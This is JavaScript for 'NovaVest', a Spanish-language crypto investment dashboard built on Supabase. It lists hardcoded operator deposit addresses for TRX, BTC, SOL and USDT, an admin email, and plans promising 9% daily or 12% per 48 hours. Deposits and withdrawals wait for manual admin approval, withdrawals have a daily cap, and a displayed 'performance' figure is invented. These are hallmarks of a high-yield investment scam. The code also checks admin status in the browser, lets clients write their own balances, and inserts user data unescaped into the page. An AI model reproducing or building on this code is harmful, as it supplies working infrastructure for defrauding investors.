const SUPABASE_URL = 'https://wuanvwxjvpnvlwioorrj.supabase.co';
const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_XOEu8hqTQ7u03Uh9A08HdQ_O4z086C9';
const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);

// ⚠️ CORREO DEL ADMINISTRADOR
const ADMIN_EMAIL = 'investnova149@gmail.com'; 

const ASSET_INFO = {
  TRX: { price: 0.2841, name: 'TRON', address: 'TPZVpWKbv97NYb7Gni8cnneMCL3AbTnJGg', icon: '<img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/trx.png" alt="TRX">' },
  BTC: { price: 67420.8, name: 'Bitcoin', address: 'bc1qv24ndm2dqw4ycwvjd9tvvjt5lslv3ukdmwqsq4', icon: '<img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png" alt="BTC">' },
  SOL: { price: 145.50, name: 'Solana', address: 'HNzFU5E36dcRhAMfCoTNrZ27QvB9j39PiudTchg9G4H7', icon: '<img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/sol.png" alt="SOL">' },
  USDT: { price: 1, name: 'Tether (TRC20)', address: 'TPZVpWKbv97NYb7Gni8cnneMCL3AbTnJGg', icon: '<img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdt.png" alt="USDT">' }
};

let currentUserId = null;
let userBalances = { TRX: 0, BTC: 0, SOL: 0, USDT: 0 };
let withdrawableBalance = 0;
let dailyWithdrawn = 0;
let pendingInvestment = null;
let timerInterval = null;
let activeInvestmentsData = [];

const PLAN_CONFIG = {
  starter: { 
    name: '❄️ Plan Starter (9%)', 
    desc: 'Ganancias diarias. Elige tu criptomoneda y el monto:', 
    roi: 0.09, 
    totalPayouts: 7,
    intervalHours: 24,
    amounts: [20, 50, 100, 200, 400] 
  },
  pro: { 
    name: '🔥 Plan Pro (12%)', 
    desc: 'Ganancias cada 48 horas. Elige tu criptomoneda y el monto:', 
    roi: 0.12, 
    totalPayouts: 7,
    intervalHours: 48,
    amounts: [500, 1000, 2000, 5000] 
  }
};

const $ = (id) => document.getElementById(id);
function money(value) { return '$' + Number(value || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
function quantity(value, asset) { return Number(value || 0).toLocaleString('en-US', { minimumFractionDigits: asset === 'BTC' ? 6 : 2, maximumFractionDigits: asset === 'BTC' ? 6 : 2 }) + ' ' + asset; }

async function loadUserData(user) {
  currentUserId = user.id;
  
  if (user.email === ADMIN_EMAIL) {
    $('adminNavBtn').classList.remove('hidden');
    $('navInner').style.gridTemplateColumns = 'repeat(5, 1fr)';
  } else {
    $('adminNavBtn').classList.add('hidden');
    $('navInner').style.gridTemplateColumns = 'repeat(4, 1fr)';
  }

  const { data: profile } = await supabaseClient.from('novavest_profiles').select('display_id').eq('user_id', user.id).maybeSingle();
  if (profile) $('investorId').textContent = 'ID de inversor: #' + profile.display_id;

  const { data: existing } = await supabaseClient.from('novavest_balances').select('asset, amount').eq('user_id', user.id);
  if (!existing || existing.length === 0) {
    const initialRows = Object.keys(ASSET_INFO).map(asset => ({ user_id: user.id, asset, amount: 0 }));
    await supabaseClient.from('novavest_balances').upsert(initialRows, { onConflict: 'user_id,asset', ignoreDuplicates: true });
  }
  
  const { data: rows } = await supabaseClient.from('novavest_balances').select('asset, amount').eq('user_id', user.id);
  userBalances = { TRX: 0, BTC: 0, SOL: 0, USDT: 0 };
  (rows || []).forEach(row => {
    if (Object.prototype.hasOwnProperty.call(userBalances, row.asset)) {
      userBalances[row.asset] = Number(row.amount) || 0;
    }
  });

  let { data: wallet } = await supabaseClient.from('novavest_wallets').select('*').eq('user_id', user.id).single();
  const today = new Date().toISOString().split('T')[0];
  
  if (!wallet) {
    await supabaseClient.from('novavest_wallets').insert({ user_id: user.id, withdrawable_balance: 0, daily_withdrawn: 0, last_withdrawn_date: today });
    withdrawableBalance = 0; dailyWithdrawn = 0;
  } else {
    if (wallet.last_withdrawn_date !== today) {
      dailyWithdrawn = 0;
      await supabaseClient.from('novavest_wallets').update({ daily_withdrawn: 0, last_withdrawn_date: today }).eq('user_id', user.id);
    } else {
      dailyWithdrawn = Number(wallet.daily_withdrawn);
    }
    withdrawableBalance = Number(wallet.withdrawable_balance);
  }

  renderUserBalances();
  loadHistory();
  loadActiveInvestments(); 
}

async function loadAdminData() {
  const { count: userCount } = await supabaseClient.from('novavest_profiles').select('*', { count: 'exact', head: true });
  $('adminTotalUsers').textContent = userCount || 0;

  const { data: deposits } = await supabaseClient.from('novavest_pending_actions').select('*').eq('type', 'deposit').order('created_at', { ascending: false });
  const depList = $('adminPendingDeposits');
  depList.innerHTML = '';
  
  if (!deposits || deposits.length === 0) {
    depList.innerHTML = '<p style="color:var(--muted); font-size:12px; text-align:center;">No hay depósitos pendientes.</p>';
  } else {
    deposits.forEach(dep => {
      const item = document.createElement('div');
      item.className = 'activity-item';
      item.innerHTML = `
        <div class="activity-icon" style="background:#10b981; color:#fff;">$</div>
        <div class="activity-info">
          <b>Depósito de ${dep.amount} ${dep.asset}</b>
          <span>User ID: ${dep.user_id.substring(0,8)}...</span>
        </div>
        <div style="display:flex; gap:5px;">
          <button onclick="approveAction('${dep.id}', 'deposit', '${dep.user_id}', '${dep.asset}', ${dep.amount})" style="background:#10b981; border:none; color:white; border-radius:6px; padding:5px 10px; font-weight:bold; cursor:pointer;">✓</button>
          <button onclick="rejectAction('${dep.id}')" style="background:#ef4444; border:none; color:white; border-radius:6px; padding:5px 10px; font-weight:bold; cursor:pointer;">✕</button>
        </div>
      `;
      depList.appendChild(item);
    });
      }
    const { data: withdraws } = await supabaseClient.from('novavest_pending_actions').select('*').eq('type', 'withdraw').order('created_at', { ascending: false });
  const withList = $('adminPendingWithdraws');
  withList.innerHTML = '';
  
  if (!withdraws || withdraws.length === 0) {
    withList.innerHTML = '<p style="color:var(--muted); font-size:12px; text-align:center;">No hay retiros pendientes.</p>';
  } else {
    withdraws.forEach(wd => {
      const item = document.createElement('div');
      item.className = 'activity-item';
      item.innerHTML = `
        <div class="activity-icon" style="background:#ef4444; color:#fff;">↗</div>
        <div class="activity-info">
          <b>Retiro de $${wd.amount} USD (${wd.asset})</b>
          <span style="font-size:10px; word-break:break-all;">Dir: ${wd.address}</span>
        </div>
        <div style="display:flex; gap:5px;">
          <button onclick="approveAction('${wd.id}', 'withdraw', '${wd.user_id}', '${wd.asset}', ${wd.amount})" style="background:#10b981; border:none; color:white; border-radius:6px; padding:5px 10px; font-weight:bold; cursor:pointer;">✓</button>
          <button onclick="rejectAction('${wd.id}')" style="background:#ef4444; border:none; color:white; border-radius:6px; padding:5px 10px; font-weight:bold; cursor:pointer;">✕</button>
        </div>
      `;
      withList.appendChild(item);
    });
  }

  const { data: invs } = await supabaseClient.from('novavest_investments').select('*');
  const invList = $('adminInvestmentsList');
  let totalVol = 0;
  invList.innerHTML = '';
  if (!invs || invs.length === 0) {
    invList.innerHTML = '<p style="color:var(--muted); font-size:12px; text-align:center;">No hay inversiones activas.</p>';
    $('adminTotalVolume').textContent = '$0.00';
  } else {
    invs.forEach(inv => {
      totalVol += Number(inv.amount_usd);
      const item = document.createElement('div');
      item.className = 'activity-item';
      item.innerHTML = `
        <div class="activity-icon" style="background:#3b82f6; color:#fff;">$</div>
        <div class="activity-info">
          <b>${inv.plan_name} (${inv.asset})</b>
          <span>Monto: $${inv.amount_usd} | Pagos: ${inv.payouts_claimed}/${inv.total_payouts}</span>
        </div>
        <div class="activity-amount" style="color:#10b981">+$${inv.profit_per_payout}/pago</div>
      `;
      invList.appendChild(item);
    });
    $('adminTotalVolume').textContent = money(totalVol);
  }
}

window.approveAction = async function(id, type, userId, asset, amount) {
  if (type === 'deposit') {
    const { data: currentBal } = await supabaseClient.from('novavest_balances').select('amount').eq('user_id', userId).eq('asset', asset).single();
    const newAmount = (currentBal?.amount || 0) + Number(amount);
    await supabaseClient.from('novavest_balances').upsert({ user_id: userId, asset: asset, amount: newAmount });
    toast('Depósito acreditado exitosamente');
  } else {
    const { data: historyItem } = await supabaseClient.from('novavest_history').select('id').eq('user_id', userId).eq('type', 'withdraw').eq('details', 'Retiro Solicitado').order('created_at', { ascending: false }).limit(1).single();
    if (historyItem) await supabaseClient.from('novavest_history').update({ details: 'Retiro Completado' }).eq('id', historyItem.id);
    toast('Retiro completado y saldo enviado.');
  }
  await supabaseClient.from('novavest_pending_actions').delete().eq('id', id);
  loadAdminData();
};

window.rejectAction = async function(id) {
  const { data: action } = await supabaseClient.from('novavest_pending_actions').select('*').eq('id', id).single();
  if (action && action.type === 'withdraw') {
    const { data: wallet } = await supabaseClient.from('novavest_wallets').select('*').eq('user_id', action.user_id).single();
    if (wallet) {
      await supabaseClient.from('novavest_wallets').update({ withdrawable_balance: Number(wallet.withdrawable_balance) + Number(action.amount) }).eq('user_id', action.user_id);
      const { data: currentBal } = await supabaseClient.from('novavest_balances').select('amount').eq('user_id', action.user_id).eq('asset', action.asset).single();
      const cryptoAmount = Number(action.amount) / ASSET_INFO[action.asset].price;
      await supabaseClient.from('novavest_balances').upsert({ user_id: action.user_id, asset: action.asset, amount: (currentBal?.amount || 0) + cryptoAmount });
    }
    toast('Retiro rechazado y saldo devuelto');
  } else { toast('Solicitud rechazada'); }
  await supabaseClient.from('novavest_pending_actions').delete().eq('id', id);
  loadAdminData();
};

async function updateWalletStorage() {
  const today = new Date().toISOString().split('T')[0];
  await supabaseClient.from('novavest_wallets').upsert({ user_id: currentUserId, withdrawable_balance: withdrawableBalance, daily_withdrawn: dailyWithdrawn, last_withdrawn_date: today });
}

function renderUserBalances() {
  const total = Object.keys(ASSET_INFO).reduce((sum, asset) => sum + userBalances[asset] * ASSET_INFO[asset].price, 0);
  $('totalBalance').textContent = money(total);
  $('activeInvestment').textContent = money(total);
  $('demoPerformance').textContent = money(total * 0.047);
  $('holdingTRX').textContent = quantity(userBalances.TRX, 'TRX');
  $('holdingBTC').textContent = quantity(userBalances.BTC, 'BTC');
  $('holdingSOL').textContent = quantity(userBalances.SOL, 'SOL');
  $('holdingUSDT').textContent = quantity(userBalances.USDT, 'USDT');
  window.updateWithdrawInfo();
}

window.navigate = function(viewName, btnElement) {
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  $('view-' + viewName).classList.add('active');
  document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
  if(btnElement) btnElement.classList.add('active');
  if (viewName === 'admin') loadAdminData();
  window.scrollTo({top: 0, behavior: 'smooth'});
};

async function saveTransaction(type, asset, amount, extra = '') {
  if (!currentUserId) return;
  await supabaseClient.from('novavest_history').insert({ user_id: currentUserId, type: type, asset: asset, amount: amount, details: extra });
  loadHistory();
}

async function loadHistory() {
  if (!currentUserId) return;
  const { data: history } = await supabaseClient.from('novavest_history').select('*').eq('user_id', currentUserId).order('created_at', { ascending: false });
  const panel = $('activityPanel');
  if (!history || history.length === 0) {
    panel.innerHTML = `<div class="activity-item" style="justify-content: center; padding: 20px 0;" id="emptyActivity"><span style="color: var(--muted); font-size: 13px;">No hay movimientos registrados</span></div>`;
    return;
  }
  panel.innerHTML = '';
  history.forEach(tx => {
    let icon = '↙', title = 'Depósito', color = '#10b981', sign = '+';
    if (tx.type === 'withdraw') { icon = '↗'; title = 'Retiro'; color = '#ef4444'; sign = '−'; }
    if (tx.type === 'investment') { icon = '✦'; title = 'Inversión'; color = '#3b82f6'; sign = '−'; }
    if (tx.type === 'reward') { icon = '★'; title = 'Ganancia'; color = '#10b981'; sign = '+'; }
    const dateObj = new Date(tx.created_at);
    const dateStr = dateObj.toLocaleDateString('es-ES', { day: '2-digit', month: 'short', hour: '2-digit', minute:'2-digit' });
    const extraTxt = tx.details ? ` (${tx.details})` : '';
    const assetData = ASSET_INFO[tx.asset] || { icon: '' };
    const item = document.createElement('div');
    item.className = 'activity-item';
    item.innerHTML = `
      <div class="coin-logo" style="width:36px; height:36px;">${assetData.icon}</div>
      <div class="activity-info"><b>${title} de ${tx.asset}${extraTxt}</b><span>${dateStr}</span></div>
      <div class="activity-amount" style="color:${color}">${sign}${quantity(tx.amount, tx.asset)}</div>
    `;
    panel.appendChild(item);
  });
}

// GUARDAR PLAN EN LA NUBE (Si falla, lanza error para NO descontar saldo)
async function saveActiveInvestment(inv) {
  const { error } = await supabaseClient.from('novavest_investments').insert({ 
    user_id: currentUserId, 
    plan_name: inv.planName, 
    asset: inv.asset, 
    amount_usd: inv.amountUsd, 
    profit_per_payout: inv.profitPerPayout,
    payout_interval_hours: inv.intervalHours,
    total_payouts: inv.totalPayouts,
    payouts_claimed: 0,
    next_payout_time: new Date(Date.now() + (inv.intervalHours * 60 * 60 * 1000)).toISOString()
  });
    if (error) { 
    console.error('Error crítico en DB al guardar plan:', error);
    throw new Error('No se pudo crear el plan en el servidor. Verifica el SQL en Supabase.'); 
  }
}

async function loadActiveInvestments() {
  if (!currentUserId) return;
  const { data: investments, error } = await supabaseClient.from('novavest_investments').select('*').eq('user_id', currentUserId);
  
  if (error) { console.error('Error cargando inversiones:', error); return; }
  
  activeInvestmentsData = investments || [];
  const container = $('activeInvestmentsSection');
  const list = $('activeInvestmentsList');
  
  if (activeInvestmentsData.length === 0) { 
    container.classList.add('hidden'); 
    return; 
  }
  
  container.classList.remove('hidden');
  list.innerHTML = '';
  
  activeInvestmentsData.forEach(inv => {
    const card = document.createElement('div');
    card.className = 'active-inv-card';
    card.innerHTML = `
      <div class="active-inv-info">
        <b>${inv.plan_name}</b>
        <span>Inversión: $${inv.amount_usd} | Pago ${inv.payouts_claimed + 1} de ${inv.total_payouts}</span>
        <span style="color: #10b981; font-weight: 700;">Ganancia: +$${inv.profit_per_payout}</span>
      </div>
      <div class="active-inv-timer" id="timer-container-${inv.id}">
        <strong id="timer-${inv.id}">00:00:00</strong>
        <span>Próximo pago</span>
      </div>
    `;
    list.appendChild(card);
  });
  
  if (timerInterval) clearInterval(timerInterval);
  timerInterval = setInterval(updateTimers, 1000);
  updateTimers();
}

function updateTimers() {
  if (!activeInvestmentsData) return;
  const now = Date.now();
  activeInvestmentsData.forEach(inv => {
    const container = $(`timer-container-${inv.id}`);
    if (!container) return;
    const remaining = new Date(inv.next_payout_time).getTime() - now;
    if (remaining <= 0) {
      if (!container.classList.contains('claimed')) {
        container.classList.add('claimed');
        container.innerHTML = `<button class="claim-btn" onclick="claimReward('${inv.id}')">Reclamar $${inv.profit_per_payout}</button>`;
      }
    } else {
      const h = Math.floor((remaining / (1000 * 60 * 60)) % 24);
      const m = Math.floor((remaining / (1000 * 60)) % 60);
      const s = Math.floor((remaining / 1000) % 60);
      const el = $(`timer-${inv.id}`);
      if (el) el.textContent = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    }
  });
}

window.claimReward = async function(invId) {
  const inv = activeInvestmentsData.find(i => i.id === invId);
  if (!inv) return;
  if (Date.now() < new Date(inv.next_payout_time).getTime()) { toast('El pago aún no está disponible.'); return; }
  
  const cryptoEarned = inv.profit_per_payout / ASSET_INFO[inv.asset].price;
  userBalances[inv.asset] = (userBalances[inv.asset] || 0) + cryptoEarned;
  await supabaseClient.from('novavest_balances').upsert({ user_id: currentUserId, asset: inv.asset, amount: userBalances[inv.asset], updated_at: new Date().toISOString() }, { onConflict: 'user_id,asset' });
  
  withdrawableBalance += Number(inv.profit_per_payout);
  await updateWalletStorage();
  renderUserBalances();
  await saveTransaction('reward', inv.asset, cryptoEarned, 'Pago ' + (inv.payouts_claimed + 1) + '/' + inv.total_payouts);
  
  const newPayoutsClaimed = inv.payouts_claimed + 1;
  
  if (newPayoutsClaimed >= inv.total_payouts) {
    await supabaseClient.from('novavest_investments').delete().eq('id', invId);
    openModal('¡Plan Completado!', `Has reclamado el último pago de <b>$${inv.profit_per_payout} USD</b>.<br><br>El plan ha finalizado. Puedes activar uno nuevo cuando quieras.`);
  } else {
    const nextTime = new Date(Date.now() + (inv.payout_interval_hours * 60 * 60 * 1000)).toISOString();
    await supabaseClient.from('novavest_investments').update({ payouts_claimed: newPayoutsClaimed, next_payout_time: nextTime }).eq('id', invId);
    openModal('¡Pago Reclamado!', `Has recibido <b>$${inv.profit_per_payout} USD</b>.<br><br>Tu próximo pago estará disponible en ${inv.payout_interval_hours} horas.`);
  }
  
  toast(`¡Has ganado $${inv.profit_per_payout}!`);
  loadActiveInvestments();
};

window.openPlanModal = function(planType) {
  const config = PLAN_CONFIG[planType];
  $('planModalTitle').innerHTML = config.name;
  $('planModalDesc').textContent = config.desc;
  $('planModalTitle').style.color = planType === 'starter' ? '#3b82f6' : '#ef4444';
  let htmlContent = '';
  Object.keys(ASSET_INFO).forEach(asset => {
    const assetData = ASSET_INFO[asset];
    htmlContent += `<div class="invest-coin-section"><div class="invest-coin-header"><div class="coin-logo" style="width:24px; height:24px; padding:2px;">${assetData.icon}</div><b>${assetData.name} (${asset})</b></div><div class="invest-grid">`;
    config.amounts.forEach(amt => {
      const profit = (amt * config.roi).toFixed(2);
      htmlContent += `<button class="invest-btn" onclick="checkBalanceForInvestment('${planType}', '${asset}', ${amt}, ${profit})"><div class="invest-btn-price">$${amt} <span>USD</span></div><div class="invest-btn-yield" style="color: ${planType === 'starter' ? '#3b82f6' : '#ef4444'};">+$${profit} / pago</div></button>`;
    });
    htmlContent += `</div></div>`;
  });
  $('planModalContent').innerHTML = htmlContent;
  $('planModal').classList.add('open');
};

window.closePlanModal = function() { $('planModal').classList.remove('open'); };

window.checkBalanceForInvestment = function(planType, asset, amountUsd, profit) {
  const cryptoNeeded = amountUsd / ASSET_INFO[asset].price;
  if ((userBalances[asset] || 0) * ASSET_INFO[asset].price < amountUsd) {
    const shortfall = amountUsd - ((userBalances[asset] || 0) * ASSET_INFO[asset].price);
    closePlanModal();
    openModal('Saldo Insuficiente', `No tienes suficiente saldo en <b>${asset}</b>.<br><br>Necesitas <b>$${shortfall.toFixed(2)} USD</b> más.`);
    return;
  }
  pendingInvestment = { planType, asset, amountUsd, profit, cryptoNeeded };
  closePlanModal();
  const cfg = PLAN_CONFIG[planType];
  $('confirmInvTitle').textContent = 'Confirmar Inversión';
  $('confirmInvText').innerHTML = `Estás a punto de invertir <b>$${amountUsd} USD</b> en el <b>${cfg.name}</b> usando tu saldo en <b>${asset}</b>.<br><br>Recibirás <b>$${profit}</b> cada ${cfg.intervalHours} horas (Total: ${cfg.totalPayouts} pagos).<br><br>¿Deseas continuar?`;
  $('confirmInvBtn').className = `modal-btn-confirm press-effect`;
  $('confirmInvModal').classList.add('open');
};
window.closeConfirmInvModal = function() { $('confirmInvModal').classList.remove('open'); pendingInvestment = null; };

window.executeInvestment = async function() {
  if (!pendingInvestment) return;
  const btn = $('confirmInvBtn'); btn.disabled = true; btn.textContent = 'Procesando…';
  const { planType, asset, amountUsd, profit, cryptoNeeded } = pendingInvestment;
  const cfg = PLAN_CONFIG[planType];
  
  try {
    // 1. Primero guardamos el plan
    await saveActiveInvestment({ 
      planName: cfg.name, 
      asset, 
      amountUsd, 
      profitPerPayout: profit, 
      intervalHours: cfg.intervalHours,
      totalPayouts: cfg.totalPayouts 
    });

    // 2. Si no falló, descontamos el saldo
    const newAmount = (userBalances[asset] || 0) - cryptoNeeded;
    await supabaseClient.from('novavest_balances').upsert({ user_id: currentUserId, asset, amount: newAmount });
    
    userBalances[asset] = newAmount;
    renderUserBalances();
    await saveTransaction('investment', asset, cryptoNeeded, cfg.name);
    
    closeConfirmInvModal();
    toast('¡Inversión realizada con éxito!');
    
    // 3. Recargamos para asegurar que el reloj aparezca
    setTimeout(() => { window.location.reload(); }, 1000);

  } catch (err) { 
    // Si hay cualquier error, el saldo NO se descuenta
    toast('Error al procesar. Tu saldo está a salvo.'); 
    console.error(err);
  } finally { 
    btn.disabled = false; btn.textContent = 'Confirmar'; 
  }
};

window.simulateDeposit = async function(){
  if (!currentUserId) return;
  const value = Number($('amount').value);
  if (!value || value <= 0) { toast('Introduce una cantidad válida'); return; }
  const asset = $('asset').value;
  const btn = $('depositBtn');
  btn.disabled = true; btn.textContent = 'Procesando…';
  const { error } = await supabaseClient.from('novavest_pending_actions').insert({ user_id: currentUserId, type: 'deposit', asset: asset, amount: value });
  btn.disabled = false; btn.textContent = 'Continuar con depósito →';
  if (error) { toast('Error: ' + error.message); return; }
  openModal('Depósito en Revisión', `Hemos recibido tu solicitud para depositar <b>${value} ${asset}</b>.<br><br>Tu saldo se acreditará una vez que el sistema verifique la transacción (de 10 min a 1 hora).`);
  toast('Solicitud de depósito enviada');
};

window.updateWithdrawInfo = function() {
  const asset = $('withdrawAsset').value;
  const coin = ASSET_INFO[asset];
  $('withdrawableBalanceUI').textContent = money(withdrawableBalance) + ' USD';
  const cryptoString = (withdrawableBalance / coin.price).toLocaleString('en-US', { minimumFractionDigits: asset === 'BTC' ? 6 : 2, maximumFractionDigits: asset === 'BTC' ? 6 : 2 });
  $('withdrawableCryptoUI').textContent = `(≈ ${cryptoString} ${asset})`;
};

window.simulateWithdraw = async function() {
  const asset = $('withdrawAsset').value;
  const amountUsd = Number($('withdrawAmount').value);
  const address = $('withdrawAddress').value.trim();
  const password = $('withdrawPassword').value;
  const btn = $('withdrawBtn');

  if (!amountUsd || amountUsd < 1) { toast('El retiro mínimo es de $1.00 USD'); return; }
  if (amountUsd > withdrawableBalance) { toast('Saldo retirable insuficiente.'); return; }
  if (dailyWithdrawn + amountUsd > 550) { toast('Has superado el límite diario de $550.00 USD.'); return; }
  const cryptoToWithdraw = amountUsd / ASSET_INFO[asset].price;
  if (cryptoToWithdraw > (userBalances[asset] || 0)) { toast('No tienes suficiente saldo en esta moneda.'); return; }
  if (!address) { toast('Introduce una dirección de destino'); return; }
  if (!password) { toast('Introduce tu contraseña'); return; }

  btn.disabled = true; btn.textContent = 'Verificando…';
  try {
    const { data: userData, error: userError } = await supabaseClient.auth.getUser();
    if (userError || !userData.user) throw new Error('Sesión no válida');

    const { error: authError } = await supabaseClient.auth.signInWithPassword({ email: userData.user.email, password: password });
    if (authError) { toast('Contraseña incorrecta.'); btn.disabled = false; btn.textContent = 'Confirmar retiro →'; return; }

    const newAmount = (userBalances[asset] || 0) - cryptoToWithdraw;
    await supabaseClient.from('novavest_balances').upsert({ user_id: currentUserId, asset, amount: newAmount });
    userBalances[asset] = newAmount;
    
    withdrawableBalance -= amountUsd;
    dailyWithdrawn += amountUsd;
    await updateWalletStorage();
    renderUserBalances();
    await saveTransaction('withdraw', asset, cryptoToWithdraw, 'Retiro Solicitado');

    await supabaseClient.from('novavest_pending_actions').insert({ user_id: currentUserId, type: 'withdraw', asset: asset, amount: amountUsd, address: address });
    
    $('withdrawAmount').value = ''; $('withdrawAddress').value = ''; $('withdrawPassword').value = '';
    openModal('Retiro en Revisión', `Tu solicitud de retiro por <b>$${amountUsd.toFixed(2)} USD</b> ha sido enviada.<br><br>Se procesará en un plazo de 1 a 24 horas.`);
    toast('Solicitud de retiro enviada');
  } catch (err) {
    toast('Error: ' + (err.message || 'No se pudo procesar'));
  } finally { btn.disabled = false; btn.textContent = 'Confirmar retiro →'; }
};

function showMessage(message, isError=false) {
  const box=$('authMessage'); box.textContent=message; box.classList.remove('hidden','auth-error');
  if(isError) box.classList.add('auth-error');
}
function clearMessage(){ $('authMessage').classList.add('hidden'); $('authMessage').textContent=''; }

function setAuthView(view) {
  clearMessage();
  ['loginForm','registerForm','resetForm'].forEach(id=>$(id).classList.add('hidden'));
  $(view+'Form').classList.remove('hidden');
  $('authTitle').textContent = view==='login'?'Bienvenido de nuevo':view==='register'?'Crea tu cuenta':'Recuperar contraseña';
  $('authSubtitle').textContent = view==='login'?'Inicia sesión para acceder a tu panel personal.':view==='register'?'Regístrate para crear tu cuenta NovaVest.':'Te enviaremos un enlace a tu correo.';
  $('authSwitch').classList.toggle('hidden',view==='reset');
  $('authSwitch').innerHTML = view==='register'?'¿Ya tienes cuenta? <button class="link-btn" type="button" id="showLogin">Iniciar sesión</button>':'¿No tienes cuenta? <button class="link-btn" type="button" id="showRegister">Crear cuenta</button>';
  $('showRegister')?.addEventListener('click',()=>setAuthView('register'));
  $('showLogin')?.addEventListener('click',()=>setAuthView('login'));
}
$('showRegister').addEventListener('click',()=>setAuthView('register'));
$('showReset').addEventListener('click',()=>setAuthView('reset'));

$('loginForm').addEventListener('submit', async e=>{
  e.preventDefault(); clearMessage(); const btn=$('loginSubmit'); btn.disabled=true; btn.textContent='Entrando…';
  const {error}=await supabaseClient.auth.signInWithPassword({email:$('loginEmail').value.trim(),password:$('loginPassword').value});
  btn.disabled=false; btn.textContent='Iniciar sesión';
  if(error) showMessage(error.message==='Invalid login credentials'?'Correo o contraseña incorrectos.':error.message,true);
});
$('registerForm').addEventListener('submit', async e=>{
  e.preventDefault(); clearMessage(); const btn=$('registerSubmit'); btn.disabled=true; btn.textContent='Creando cuenta…';
  const {data,error}=await supabaseClient.auth.signUp({ email:$('registerEmail').value.trim(), password:$('registerPassword').value, options:{data:{full_name:$('fullName').value.trim()},emailRedirectTo:window.location.origin+window.location.pathname} });
  btn.disabled=false; btn.textContent='Crear cuenta';
  if(error){showMessage(error.message,true);return;}
  if(data.session){showDashboard(data.user);}
  else showMessage('Cuenta creada. Revisa tu correo para confirmar.');
});

$('resetForm').addEventListener('submit',async e=>{
  e.preventDefault();clearMessage();
  const {error}=await supabaseClient.auth.resetPasswordForEmail($('resetEmail').value.trim(),{redirectTo:window.location.origin+window.location.pathname});
  if(error) showMessage(error.message,true); else showMessage('Enlace enviado si el correo está registrado.');
});

function showDashboard(user){
  $('authScreen').classList.add('hidden');$('dashboard').classList.remove('hidden');
  const name=user?.user_metadata?.full_name || user?.email?.split('@')[0] || 'inversor';
  $('welcomeName').textContent=name.split(' ')[0];
  $('investorName').textContent=name;
  $('investorEmail').textContent=user?.email||'Cuenta NovaVest';
  if(user?.created_at) {
    const date = new Date(user.created_at).toLocaleDateString('es-ES', { year: 'numeric', month: 'long', day: 'numeric' });
    $('investorDate').textContent = 'Miembro desde: ' + date;
  }
  $('avatar').textContent=name.split(/\s+/).slice(0,2).map(s=>s[0]).join('').toUpperCase();
  $('profileInitials').textContent=$('avatar').textContent;
  loadUserData(user).catch(err => { console.error(err); toast('Error cargando datos.'); });
}

async function signOut(){
  const {error}=await supabaseClient.auth.signOut();
  if(error){toast(error.message);return;}
  currentUserId=null; withdrawableBalance=0; dailyWithdrawn=0;
  $('dashboard').classList.add('hidden');$('authScreen').classList.remove('hidden');
  setAuthView('login'); toast('Sesión cerrada');
  navigate('home', document.querySelectorAll('.nav button')[0]);
  $('activeInvestmentsSection').classList.add('hidden');
}
window.signOut=signOut;

supabaseClient.auth.onAuthStateChange((event,session)=>{
  if(session?.user) showDashboard(session.user);
  else if(event==='SIGNED_OUT'){ $('dashboard').classList.add('hidden');$('authScreen').classList.remove('hidden'); }
});
supabaseClient.auth.getSession().then(({data})=>{
  if(data.session?.user) showDashboard(data.session.user);
});

window.changeAsset = function() {
  const asset = $('asset').value;
  const coin = ASSET_INFO[asset];
  $('coinBadge').innerHTML = coin.icon;
  $('unit').textContent = asset;
  updateEstimate();
  $('wallet').textContent = coin.address;
  $('qr-image').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${coin.address}`;
  $('qr-asset-name').textContent = asset === 'USDT' ? 'USDT (TRC20)' : asset;
  $('qr-network').style.display = asset === 'USDT' ? 'inline' : 'none';
};

window.updateEstimate = function() {
  const value = Math.max(0, Number($('amount').value)||0);
  const price = ASSET_INFO[$('asset').value].price;
  $('estimate').textContent = '≈ $' + (value * price).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2}) + ' USD';
};

window.copyWallet = async function() {
  try { await navigator.clipboard.writeText($('wallet').textContent); toast('Dirección copiada'); }
  catch(e) { toast('No se pudo copiar'); }
};

window.openModal=function(title,message){ $('modalTitle').textContent=title; $('modalText').innerHTML=message; $('modal').classList.add('open'); };
window.closeModal=function(){$('modal').classList.remove('open');};
window.toast=function(message){const el=$('toast');el.textContent=message;el.classList.add('show');clearTimeout(window.__toastTimer);window.__toastTimer=setTimeout(()=>el.classList.remove('show'),3000);};
